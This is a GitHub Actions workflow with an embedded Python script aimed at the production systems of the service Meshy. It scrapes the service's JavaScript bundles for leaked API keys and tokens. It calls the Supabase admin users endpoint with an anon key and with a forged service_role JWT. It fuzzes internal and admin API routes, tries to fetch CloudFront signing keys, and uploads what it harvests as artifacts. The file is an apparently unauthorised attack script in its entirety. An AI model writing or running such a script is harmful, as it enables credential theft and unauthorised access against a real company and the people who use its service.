name: Meshy CDN Fuzzer

on:
  workflow_dispatch:

jobs:
  fuzz:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Fuzz Meshy CDN & API
        run: |
          python3 -c "
import requests, re, json

print('=== CDN JS FUZZING ===')
URLS = [
    'https://cdn.meshy.ai/main.js',
    'https://cdn.meshy.ai/app.js',
    'https://cdn.meshy.ai/bundle.js',
    'https://cdn.meshy.ai/assets/index.js',
    'https://cdn.meshy.ai/js/main.js',
    'https://cdn.meshy.ai/dist/app.js',
    'https://cdn.meshy.ai/static/js/main.js',
    'https://cdn.meshy.ai/_next/static/chunks/pages/index.js',
    'https://cdn.meshy.ai/assets/index-D4H7Z9Kf.js',
]
for url in URLS:
    try:
        r = requests.get(url, timeout=15)
        if r.status_code == 200:
            print(f'FOUND: {url} ({len(r.text):,} bytes)')
            keys = re.findall(r'msy_[a-zA-Z0-9_]{20,}', r.text)
            tokens = re.findall(r'eyJ[a-zA-Z0-9_=-]{50,}', r.text)
            internal_paths = re.findall(r'[\"\x27](/[a-z][a-z/\-_]{8,})[\"\x27]', r.text)
            if keys: print(f'  KEYS: {keys}')
            if tokens: print(f'  TOKENS: {tokens[:3]}')
            if internal_paths: print(f'  PATHS: {list(set(internal_paths))[:20]}')
            with open(f'cdn_{url.split(\"/\")[-1]}.txt', 'w') as f:
                f.write(r.text)
        else:
            print(f'{r.status_code} {url}')
    except Exception as e:
        print(f'ERR {url}: {e}')

print()
print('=== CLOUDFRONT SIGNING TESTS ===')
API = 'https://api.meshy.ai'
TEST_KEY = 'msy_dummy_api_key_for_test_mode_12345678'
r = requests.get(f'{API}/openapi/v1/balance', headers={'Authorization': f'Bearer {TEST_KEY}'}, timeout=10)
print(f'Balance: {r.status_code} {r.text[:200]}')

# Try v2 balance
r2 = requests.get(f'{API}/openapi/v2/balance', headers={'Authorization': f'Bearer {TEST_KEY}', 'X-Api-Version': 'v2026.04.03.post7'}, timeout=10)
print(f'Balance v2: {r2.status_code} {r2.text[:200]}')

# Try admin routes via Supabase service role
SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA'
r3 = requests.get('https://auth.meshy.ai/auth/v1/admin/users', headers={'Authorization': f'Bearer {SUPABASE_KEY}', 'apikey': SUPABASE_KEY}, timeout=10)
print(f'Admin users: {r3.status_code} {r3.text[:200]}')

# Try Supabase service role key pattern
svc_key = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTcxNTU4NDA2NSwiZXhwIjoyMDMxMTYwMDY1fQ.dummy'
r4 = requests.get('https://auth.meshy.ai/auth/v1/admin/users', headers={'Authorization': f'Bearer {svc_key}', 'apikey': svc_key}, timeout=10)
print(f'Svc role admin: {r4.status_code} {r4.text[:200]}')

print()
print('=== FUZZING OPENAPI PATHS ===')
paths = ['/openapi/v1/credits','/openapi/v2/balance','/openapi/v1/account','/openapi/v1/subscription','/openapi/v1/quota','/openapi/v1/tier','/openapi/v1/plan','/openapi/v1/entitlement','/openapi/v1/limits','/openapi/v1/usage','/openapi/v1/stats','/internal/v1/balance','/internal/v1/admin','/admin/v1/balance','/v1/balance','/v2/balance']
for p in paths:
    r = requests.get(f'{API}{p}', headers={'Authorization': f'Bearer {TEST_KEY}'}, timeout=5)
    print(f'{r.status_code:3d} {p}')

print()
print('=== TRY CLOUDFRONT KEY URLS ===')
cf_urls = [
    'https://assets.meshy.ai/cloudfront.pem',
    'https://assets.meshy.ai/public.pem',
    'https://api.meshy.ai/cloudfront.pem',
    'https://api.meshy.ai/public_key.pem',
]
for u in cf_urls:
    try:
        r = requests.get(u, timeout=5)
        print(f'{r.status_code} {u} => {r.text[:100]}')
    except:
        pass

print()
print('=== SIGNING ALGORITHM TEST ===')
# Try to get the CloudFront key from JS or other sources
r = requests.get('https://api.meshy.ai/openapi/v1/image-to-3d', headers={'Authorization': TEST_KEY, 'Content-Type': 'application/json'}, json={'image_url': 'https://example.com/test.jpg'}, timeout=10)
print(f'Image-to-3d: {r.status_code} => {r.text[:300]}')
"
      - name: Upload artifacts
        uses: actions/upload-artifact@v4
        with:
          name: meshy-cdn-fuzz-results
          path: cdn_*.txt
          retention-days: 1
